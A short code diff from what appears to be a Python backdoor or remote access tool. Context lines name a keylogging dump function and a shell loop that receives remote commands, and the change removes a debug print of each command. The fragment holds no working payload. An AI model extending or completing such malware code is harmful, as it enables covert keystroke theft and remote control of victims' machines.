@@ -73,7 +73,6 @@ def keylog_dump():
 def shell():
     while True:
         command = reliable_recv()
-        print(command)
         if command == 'quit':
             break
         elif command == 'help':
